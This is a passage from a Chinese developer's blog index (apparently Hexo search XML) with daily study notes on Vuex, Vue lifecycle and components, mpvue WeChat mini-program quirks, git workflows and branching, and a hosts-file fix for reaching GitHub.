<span class="keyword">default</span> store;</span><br></pre></td></tr></table></figure><p>这时就可以在组件中调用仓库state中的数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">    loading() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.$store.state.loading;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><blockquote><p>为什么要用计算属性，因为state状态是响应式的，也就是说state里面的数据发生了变化，组件里的数据是自动更新的。</p></blockquote><blockquote><p>this.$store：我们最开始把vuex挂载到了根组件上（在main.js中），所以在任何地方都可以调用$store，和$router是一个道理</p></blockquote><p><strong>如果想引入很多数据，一个一个写又很麻烦，就可以用mapState</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">    age: <span class="number">18</span>,</span><br><span class="line">    name: <span class="string">'xiaoming'</span>,</span><br><span class="line">    ...mapState(&#123;  <span class="comment">//这里的...不是省略号了,是对象扩展符</span></span><br><span class="line">        sex: <span class="function"><span class="params">state</span> =&gt;</span> state.person.sex,</span><br><span class="line">        height: <span class="function"><span class="params">state</span> =&gt;</span> state.person.sex</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用扩展运算符可以使数据与其他计算属性的数据混合在一起</span></span><br></pre></td></tr></table></figure><h2 id="调用接口"><a href="#调用接口" class="headerlink" title="调用接口"></a>调用接口</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//页面中的钩子函数调用indexRecommend接口，async/await保证异步执行顺序</span></span><br><span class="line"><span class="keyword">async</span> created() &#123;</span><br><span class="line">        <span class="keyword">this</span>.recommend = <span class="keyword">await</span> <span class="keyword">this</span>.$serv.indexRecommend();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后面由于涉及到公司的代码就不贴出了，贴一些学到的代码</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].forEach(<span class="function"><span class="params">x</span>=&gt;</span> <span class="built_in">console</span>.log(x*x))   <span class="comment">//输出1,4,9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//解析赋值，将req对象中定义的方法分别赋值给get,post等方法，到此请求方法定义成功</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> &#123; get, post, put, jsonp, <span class="attr">delete</span> : del &#125; = req;</span><br></pre></td></tr></table></figure><h2 id="每日一题"><a href="#每日一题" class="headerlink" title="每日一题"></a>每日一题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(length)  <span class="comment">//词法作用域，找foo函数外面定义的length，即window.length</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> length = <span class="string">'jin'</span></span><br><span class="line">    foo()</span><br><span class="line">&#125;</span><br><span class="line">bar()  <span class="comment">//输出的为window.length即为iframe的个数</span></span><br></pre></td></tr></table></figure><h2 id="github打不开怎么办"><a href="#github打不开怎么办" class="headerlink" title="github打不开怎么办"></a>github打不开怎么办</h2><ul><li>进入网站的域名解析网址：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Ftool.chinaz.com%2Fdns%2F" target="_blank" rel="noopener">http://tool.chinaz.com/dns/</a> ，在A类型的查询中输入github.com，找出最快的IP地址 </li><li>进入  <strong>C:\Windows\System32\drivers\etc\hosts</strong> </li><li>添加对应ip，例如   52.74.223.119 github </li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.5.6</title>
      <link href="2020/05/06/%E6%97%A5%E5%B8%B8-2020.5.6/"/>
      <url>2020/05/06/%E6%97%A5%E5%B8%B8-2020.5.6/</url>
      
        <content type="html"><![CDATA[<ul><li>git pull 和 git clone的区别</li><li>git clone和download zip的区别</li><li>上传代码的流程</li><li>关于分支的理解</li></ul><a id="more"></a><h2 id="git-pull-和-git-clone的区别"><a href="#git-pull-和-git-clone的区别" class="headerlink" title="git pull 和 git clone的区别"></a>git pull 和 git clone的区别</h2><ul><li>clone 是本地没有 repository 时，将远程 repository 整个下载过来。</li><li>pull 是本地有 repository 时，将远程 repository 里新的 commit 数据(如有的话)下载过来，并且与本地代码merge。</li></ul><blockquote><p>note：git pull相当于git fetch和git merge。</p><p>其意思是先从远程下载git项目里的文件，然后将文件与本地的分支进行merge。</p></blockquote><h2 id="git-clone和download-zip的区别"><a href="#git-clone和download-zip的区别" class="headerlink" title="git clone和download zip的区别"></a>git clone和download zip的区别</h2><ul><li>采用git clone的项目包含.git目录，这里面有历史版本信息</li><li>采用下载zip文件的是没有版本历史信息的。只是当前分支的最新版本</li></ul><h2 id="上传代码的流程"><a href="#上传代码的流程" class="headerlink" title="上传代码的流程"></a>上传代码的流程</h2><ul><li>git clone 克隆代码到本地</li><li>cd 目标文件夹</li><li>git branch -a 查看远程分支</li><li>git checkout branchname 切换分支</li><li>git pull origin branchname  拉取分支</li><li>修改代码</li><li>git add .</li><li>git status 查看修改信息</li><li>git commit -m ‘信息’</li><li>git push -u origin branchname</li></ul><h2 id="关于分支的理解"><a href="#关于分支的理解" class="headerlink" title="关于分支的理解"></a>关于分支的理解</h2><ul><li>master主干：线上的版本：主干的代码不做开发，目的是保留现在线上的版本，如果现在线上的代码出现任何的BUG或紧急添加新功能，就从master拉下来一个分支master_alter，master_alter分支的代码修改或添加后，然后测试打包发布，发布后把这个分支master_alter合并到master；删除master_alter分支，这时master任然是线上的版本；</li><li>release分支：预发布的版本、正在测试的版本：新需求已经开发完成，9.30号上线，这段的时间就是测试和修改BUG，我们给这个分支起名字叫release_930，等release_930版本的代码发布上线后，把release分支合并到master主干上，把release分支删除；</li><li>dev分支：正在开发的版本：假如公司出了两个新的需求，要给现在的商城项目添加一个新的功能叫购物车，然后我的这个分支叫dev_spc，日常的开发工作就一直在这个dev_spc这个分支上面；还要给商城加上店铺功能，然后我旁边哥们的分支就叫dev_shops，旁边这哥们他日常的开发工作就一直在这个dev_shops这个分支上面；开发完成后从dev分支合并到release分支，发布后再合并到master主干；master主干的代码不做开发用，保留现在线上的版本代码；</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.30</title>
      <link href="2020/04/30/%E6%97%A5%E5%B8%B8-2020.4.30/"/>
      <url>2020/04/30/%E6%97%A5%E5%B8%B8-2020.4.30/</url>
      
        <content type="html"><![CDATA[<h1 id="今日清单"><a href="#今日清单" class="headerlink" title="今日清单"></a>今日清单</h1><ul><li>mpvue绑定图片src属性时的问题</li><li>vue的异步请求放在哪个钩子函数中合适，mpvue呢</li></ul><a id="more"></a><h2 id="mpvue绑定图片src属性时的问题"><a href="#mpvue绑定图片src属性时的问题" class="headerlink" title="mpvue绑定图片src属性时的问题"></a>mpvue绑定图片src属性时的问题</h2><p>绑定图片的src属性时，一般是这样的，路径直接写src中的static文件夹下的图片就行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"路径"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure><p>想要动态绑定属性时，是这样的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">"imgPath"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">data () &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">imgPath:<span class="string">"路径"</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在mpvue里，最终生成的是dist目录，所以在动态绑定时，需要将图片路径设置为dist目录下的static文件夹</p><h2 id="vue的异步请求放在哪个钩子函数中合适"><a href="#vue的异步请求放在哪个钩子函数中合适" class="headerlink" title="vue的异步请求放在哪个钩子函数中合适"></a>vue的异步请求放在哪个钩子函数中合适</h2><p>首先复习一下vue的生命周期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">beforeCreate（创建前）: 在数据观测和初始化事件还未开始,data、watcher、methods都还不存在，但是$route已存在，可以根据路由信息进行重定向等操作。</span><br><span class="line"></span><br><span class="line">created(创建后)：在实例创建之后被调用，该阶段可以访问data，使用watcher、events、methods，也就是说 数据观测(data observer) 和event/watcher 事件配置 已完成。但是此时dom还没有被挂载。该阶段允许执行http请求操作。</span><br><span class="line"></span><br><span class="line">beforeMount （挂载前）：将HTML解析生成AST节点，再根据AST节点动态生成渲染函数。相关render函数首次被调用(划重点)。</span><br><span class="line"></span><br><span class="line">mounted (挂载后)：在挂载完成之后被调用，执行render函数生成虚拟dom，创建真实dom替换虚拟dom，并挂载到实例。可以操作dom，比如事件监听</span><br><span class="line"></span><br><span class="line">beforeUpdate：vm.data更新之后，虚拟dom重新渲染之前被调用。在这个钩子可以修改vm.data更新之后，虚拟dom重新渲染之前被调用。在这个钩子可以修改vm.data更新之后，虚拟dom重新渲染之前被调用。在这个钩子可以修改vm.data，并不会触发附加的冲渲染过程。</span><br><span class="line"></span><br><span class="line">updated：虚拟dom重新渲染后调用，若再次修改$vm.data，会再次触发beforeUpdate、updated，进入死循环。</span><br><span class="line"></span><br><span class="line">beforeDestroy：实例被销毁前调用，也就是说在这个阶段还是可以调用实例的。</span><br><span class="line"></span><br><span class="line">destroyed：实例被销毁后调用，所有的事件监听器已被移除，子实例被销毁。</span><br></pre></td></tr></table></figure><blockquote><p>实际上在created，beforeMount，mounted都可以，因为此时data已经创建，后端传来的数据可以放入data中。</p></blockquote><ul><li>created 阶段的优势是：请求时间比较早，页面 loading 时间相对较短； </li></ul><p>有人说如果需要操作dom需要放在mounted中，因为mounted完成了挂载，真实的DOM存在了。</p><p>但其实当生命周期遇到异步函数时，都会先执行完生命周期，再去执行异步函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">            el: <span class="string">"#app"</span>,</span><br><span class="line">            template: <span class="string">"&lt;div&gt;hello world&lt;/div&gt;"</span>,</span><br><span class="line">            beforeCreate: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"beforeCreate"</span>)</span><br><span class="line">            &#125;,</span><br><span class="line">            created: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"created"</span>)</span><br><span class="line">                setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="built_in">console</span>.log(<span class="number">1</span>)</span><br><span class="line">                &#125;,<span class="number">0</span>)</span><br><span class="line">            &#125;,</span><br><span class="line">            beforeMount: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="keyword">this</span>.$el)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"beforeMount"</span>)</span><br><span class="line">            &#125;,</span><br><span class="line">            mounted: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"mounted"</span>)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="keyword">this</span>.$el)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// beforeCreate</span></span><br><span class="line"><span class="comment">//created</span></span><br><span class="line"><span class="comment">//&lt;div id='app'&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="comment">//beforeMount</span></span><br><span class="line"><span class="comment">//mounted</span></span><br><span class="line"><span class="comment">//&lt;div&gt;hello world&lt;/div&gt;</span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure><p>但是在mpvue中就不行了，因为mpvue的created会一次性执行完，这里用到原生小程序的onLoad。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.28</title>
      <link href="2020/04/28/%E6%97%A5%E5%B8%B8-2020.4.28/"/>
      <url>2020/04/28/%E6%97%A5%E5%B8%B8-2020.4.28/</url>
      
        <content type="html"><![CDATA[<ul><li>e.mp.detail.value</li><li>mpvue绑定微信用户</li><li>mpvue云开发</li><li>mpvue的created</li><li>page not register</li><li>控制台输出对象，输出的是[object Object]</li></ul><a id="more"></a><h2 id="e-mp-detail-value"><a href="#e-mp-detail-value" class="headerlink" title="e.mp.detail.value"></a>e.mp.detail.value</h2><p>实时获取输入框的值时，原生小程序代码和mpvue是有区别的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原生</span></span><br><span class="line">input: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.inputVal = e.detail.value</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mpvue</span></span><br><span class="line">input: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.inputVal = e.mp.detail.value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="mpvue绑定微信用户"><a href="#mpvue绑定微信用户" class="headerlink" title="mpvue绑定微信用户"></a>mpvue绑定微信用户</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">'btn'</span> v-<span class="keyword">if</span>=<span class="string">"canIUse"</span> open-type=<span class="string">"getUserInfo"</span>   @getuserinfo=<span class="string">"bindGetUserInfo"</span>&gt;登录&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">bindGetUserInfo: function (e) &#123;</span></span><br><span class="line"><span class="regexp">      /</span><span class="regexp">/ console.log(e.mp.detail.userInfo)</span></span><br><span class="line"><span class="regexp">      if (e.mp.detail.userInfo) &#123;</span></span><br><span class="line"><span class="regexp">        wx.navigateTo(&#123; url: '../</span>login/main<span class="string">' &#125;)// 跳转到绑定学员界面</span></span><br><span class="line"><span class="string">      &#125; else &#123;</span></span><br><span class="line"><span class="string">        // 用户按了拒绝按钮</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    created () &#123;</span></span><br><span class="line"><span class="string">        wx.getSetting(&#123;</span></span><br><span class="line"><span class="string">          success: function (res) &#123;</span></span><br><span class="line"><span class="string">            if (res.authSetting['</span>scope.userInfo<span class="string">']) &#123;</span></span><br><span class="line"><span class="string">              // 已经授权，可以直接调用 getUserInfo 获取头像昵称</span></span><br><span class="line"><span class="string">              wx.getUserInfo(&#123;</span></span><br><span class="line"><span class="string">                success: function (res) &#123;</span></span><br><span class="line"><span class="string">                  console.log(res.userInfo)</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">              &#125;)</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">      &#125;</span></span><br></pre></td></tr></table></figure><h2 id="mpvue云开发"><a href="#mpvue云开发" class="headerlink" title="mpvue云开发"></a>mpvue云开发</h2><p>云开发，src/main.js里加上如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wx.cloud.init(&#123;</span><br><span class="line">  traceUser: <span class="literal">true</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="mpvue的created"><a href="#mpvue的created" class="headerlink" title="mpvue的created"></a>mpvue的created</h2><p>mpvue的created会一次性把所有页面的都执行完，不是每个页面加载的时候执行</p><h2 id="page-not-register"><a href="#page-not-register" class="headerlink" title="page not register"></a>page not register</h2><p>一开始总会出现这个情况，后来使用<code>npm run build</code>后就没有了</p><h2 id="控制台输出对象，输出的是-object-Object"><a href="#控制台输出对象，输出的是-object-Object" class="headerlink" title="控制台输出对象，输出的是[object Object]"></a>控制台输出对象，输出的是[object Object]</h2><p>原因：在页面传参时我想要传一个对象，就用了<code>&#39;obj=&#39;+obj</code>，这里的obj遇到+会调用<code>toString</code>方法转换为<code>[object Object]</code></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.24</title>
      <link href="2020/04/24/%E6%97%A5%E5%B8%B8-2020.4.24/"/>
      <url>2020/04/24/%E6%97%A5%E5%B8%B8-2020.4.24/</url>
      
        <content type="html"><![CDATA[<ul><li>组件化</li><li>如何注册一个组件（全局，局部）</li><li>.Vue文件也是组件</li><li>Vue项目结构</li><li>父子组件的通信</li></ul><a id="more"></a><h2 id="组件化"><a href="#组件化" class="headerlink" title="组件化"></a>组件化</h2><p><strong>所谓组件化，就是把页面拆分成多个组件，每个组件依赖的 CSS、JS、模板、图片等资源放在一起开发和维护。</strong> 因为组件是资源独立的，所以组件在系统内部可复用，组件和组件之间可以嵌套，如果项目比较复杂，可以极大简化代码量，并且对后期的需求变更和维护也更加友好。</p><p><strong>vue的组件化</strong>：任何的应用都会被抽象为一棵组件树。</p><p> <img src="https://img-blog.csdnimg.cn/20181220155021919" alt="1"></p><h2 id="如何注册一个组件（全局，局部）"><a href="#如何注册一个组件（全局，局部）" class="headerlink" title="如何注册一个组件（全局，局部）"></a>如何注册一个组件（全局，局部）</h2><ul><li>全局注册：<code>Vue.component</code>，所有的Vue实例都可以使用。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">mycomponent</span>&gt;</span><span class="tag">&lt;/<span class="name">mycomponent</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">       Vue.component(<span class="string">'mycomponent'</span>,&#123;</span></span><br><span class="line"><span class="xml">           template:`<span class="tag">&lt;<span class="name">div</span>&gt;</span>这是一个自定义组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span>`,</span></span><br><span class="line"><span class="undefined">           data()&#123;</span></span><br><span class="line"><span class="javascript">               <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                   message:<span class="string">'hello world'</span></span></span><br><span class="line"><span class="undefined">               &#125;</span></span><br><span class="line"><span class="undefined">           &#125;</span></span><br><span class="line"><span class="undefined">       &#125;)       </span></span><br><span class="line"><span class="undefined">       </span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">           el:<span class="string">'#app'</span></span></span><br><span class="line"><span class="undefined">       &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>局部注册：在某个Vue实例内注册，只有该实例可以使用</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">mycomponent</span>&gt;</span><span class="tag">&lt;/<span class="name">mycomponent</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">      </span></span><br><span class="line"><span class="undefined">       </span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">           el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">           components:&#123;</span></span><br><span class="line"><span class="javascript">               <span class="string">'mycomponent'</span>:&#123;</span></span><br><span class="line"><span class="xml">                   template: `<span class="tag">&lt;<span class="name">div</span>&gt;</span>这是一个自定义的局部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span>`</span></span><br><span class="line"><span class="undefined">               &#125;</span></span><br><span class="line"><span class="undefined">           &#125;</span></span><br><span class="line"><span class="undefined">       &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="模板只有一个根元素"><a href="#模板只有一个根元素" class="headerlink" title="模板只有一个根元素"></a>模板只有一个根元素</h3><h3 id="组件中的data必须是函数"><a href="#组件中的data必须是函数" class="headerlink" title="组件中的data必须是函数"></a>组件中的data必须是函数</h3><blockquote><p>data不能是一个对象，由于JS中对象类型的变量实际上保存的是对象的<code>引用</code>，所以当存在多个这样的组件时，会共享数据，导致一个组件中数据的改变会引起其他组件数据的改变。</p><p>而使用一个返回对象的函数，每次使用组件都会创建一个新的对象，这样就不会出现<strong>共享数据</strong>的问题来了。</p></blockquote><h3 id="自定义标签的限制"><a href="#自定义标签的限制" class="headerlink" title="自定义标签的限制"></a>自定义标签的限制</h3><p>标准HTML中，一些元素中只能放置特定的子元素，另一些元素只能存在于特定的父元素中。 比如table 元素中只能由一个或多个 tr、th 或 td 元素组成。tr 元素定义表格行，th 元素定义表头，td 元素定义表格单元。这时应该用<strong>is</strong>属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--无效--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">my-row</span>&gt;</span>...<span class="tag">&lt;/<span class="name">my-row</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--正确--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span> <span class="attr">is</span>=<span class="string">"my-row"</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Vue文件也是组件"><a href="#Vue文件也是组件" class="headerlink" title=".Vue文件也是组件"></a>.Vue文件也是组件</h2><p>每个.vue文件包含三种类型的顶级语言块 <template>, <script> 和 <style>。这三个部分分别代表了 html,js,css </p><p>来看一个最简单的Vue组件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;                                  &lt;!--template标签内是html--&gt;     </span><br><span class="line">  &lt;div class=&apos;page-index&apos;&gt;                  &lt;!--注意里面只有一个根标签--&gt;</span><br><span class="line">    &lt;Header&gt;&lt;/Header&gt;                       &lt;!--自定义的组件--&gt;</span><br><span class="line">    &lt;div&gt;&lt;/div&gt;</span><br><span class="line">    &lt;Footer&gt;&lt;/Footer&gt;                       &lt;!--自定义的组件--&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Header from &apos;../components/header.vue&apos;   //引用自定义组件</span><br><span class="line">import Footer from &apos;../components/footer.vue&apos;   //引用自定义组件</span><br><span class="line">export default &#123;                                //export default里面写数据和方法</span><br><span class="line">  components: &#123; Header, Footer &#125;,               //组件</span><br><span class="line">  data () &#123;                                     //数据，记得用函数形式</span><br><span class="line">    return &#123;</span><br><span class="line">      list: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  created () &#123;                                  //钩子函数</span><br><span class="line">    this.getData()</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;                                    //方法</span><br><span class="line">    getData () &#123;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  .article_list &#123;margin: auto;&#125;</span><br><span 